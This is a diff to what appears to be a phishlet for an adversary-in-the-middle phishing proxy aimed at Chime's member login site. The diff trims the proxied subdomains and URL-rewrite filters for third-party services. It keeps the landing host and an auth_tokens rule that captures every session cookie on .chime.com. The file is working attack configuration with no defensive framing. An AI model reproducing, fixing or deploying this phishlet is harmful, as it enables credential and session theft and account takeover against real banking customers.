@@ -5,38 +5,9 @@ proxy_hosts:
   - {phish_sub: 'member', orig_sub: 'member', domain: 'chime.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: '', orig_sub: '', domain: 'chime.com', session: true, is_landing: false, auto_filter: false}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'chime.com', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'nd', orig_sub: 'nd', domain: 'chime.com', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'transaction', orig_sub: 'transaction', domain: 'chime.com', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'chime-api', orig_sub: 'chime-api', domain: 'arkoselabs.com', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'cdnjs', orig_sub: 'cdnjs', domain: 'cloudflare.com', session: false, is_landing: false, auto_filter: false}
-  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'segment.com', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'api-chime.nd', orig_sub: 'api-chime.nd', domain: 'nudatasecurity.com', session: true, is_landing: false, auto_filter: false}
 
 sub_filters:
-  - {triggers_on: 'member.chime.com', orig_sub: 'member', domain: 'chime.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'member', domain: 'chime.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'member', domain: 'chime.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: '', domain: 'chime.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: '', domain: 'chime.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'www', domain: 'chime.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'www', domain: 'chime.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'www', domain: 'chime.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'nd', domain: 'chime.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'nd', domain: 'chime.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'fonts', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'transaction', domain: 'chime.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'transaction', domain: 'chime.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'chime-api', domain: 'arkoselabs.com', search: 'https://{hostname}/fc/api/sri/', replace: 'https://{hostname}/fc/api/sri/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'chime-api', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'cdn', domain: 'segment.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'cdn', domain: 'segment.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'api-chime.nd', domain: 'nudatasecurity.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'member.chime.com', orig_sub: 'api-chime.nd', domain: 'nudatasecurity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-
+  
 auth_tokens:
   - domain: '.chime.com'
     keys: ['.*,regexp']
